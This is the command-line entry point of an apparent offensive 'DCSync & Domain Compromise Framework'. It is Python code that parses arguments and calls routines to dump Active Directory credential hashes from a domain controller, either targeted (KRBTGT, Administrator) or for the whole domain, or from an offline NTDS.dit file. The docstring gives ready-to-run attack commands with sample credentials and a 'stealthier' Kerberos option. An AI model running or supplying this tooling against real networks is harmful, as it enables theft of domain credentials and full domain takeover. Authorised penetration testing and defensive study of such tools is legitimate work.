#!/usr/bin/env python3
"""
CLI Entry Point — DCSync & Domain Compromise Framework

Examples:
    # Targeted DCSync — KRBTGT only
    python -m dcsync_framework -d corp.local --dc 10.10.10.1 \\
        -u admin -p 'Pass!' --targeted -t krbtgt Administrator

    # Full domain dump
    python -m dcsync_framework -d corp.local --dc 10.10.10.1 \\
        -u admin -p 'Pass!' --full

    # Offline NTDS.dit parsing
    python -m dcsync_framework -d corp.local --dc 10.10.10.1 \\
        -u admin --offline --ntds ntds.dit --system SYSTEM

    # With Kerberos auth (stealthier)
    export KRB5CCNAME=admin.ccache
    python -m dcsync_framework -d corp.local --dc 10.10.10.1 \\
        -u admin -k --targeted -t krbtgt
"""

import argparse

from .core.framework import DCSyncFramework


def main():
    parser = argparse.ArgumentParser(
        description="DCSync & Domain Compromise Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("--dc", required=True)
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-p", "--password", default="")
    parser.add_argument("-H", "--hash", default="")
    parser.add_argument("--aes-key", default="")
    parser.add_argument("-k", "--kerberos", action="store_true")
    parser.add_argument("-o", "--output", default="dcsync")

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--targeted", action="store_true", help="Targeted DCSync")
    mode.add_argument("--full", action="store_true", help="Full domain dump")
    mode.add_argument("--offline", action="store_true", help="Offline NTDS.dit")
    mode.add_argument("--analyze", help="Analyze existing dump file")

    parser.add_argument("-t", "--targets", nargs="+", help="Target users for targeted mode")
    parser.add_argument("--ntds", help="Path to NTDS.dit (offline mode)")
    parser.add_argument("--system", help="Path to SYSTEM hive (offline mode)")

    args = parser.parse_args()

    framework = DCSyncFramework(
        domain=args.domain, dc_ip=args.dc, username=args.username,
        password=args.password, ntlm_hash=args.hash,
        aes_key=args.aes_key, use_kerberos=args.kerberos,
        output_dir=args.output,
    )

    if args.targeted:
        targets = args.targets or ["krbtgt", "Administrator"]
        framework.targeted_dcsync(targets)
        framework.generate_report()

    elif args.full:
        ntds = framework.full_dcsync()
        if ntds:
            framework.analyze_dump(ntds)
        framework.generate_report()

    elif args.offline:
        if args.ntds and args.system:
            ntds = framework.ntds_offline_extraction(args.ntds, args.system)
            if ntds:
                framework.analyze_dump(ntds)
        else:
            print("[-] --ntds and --system required for offline mode")
            framework.print_ntds_extraction_methods()

    elif args.analyze:
        framework.analyze_dump(args.analyze)


if __name__ == "__main__":
    main()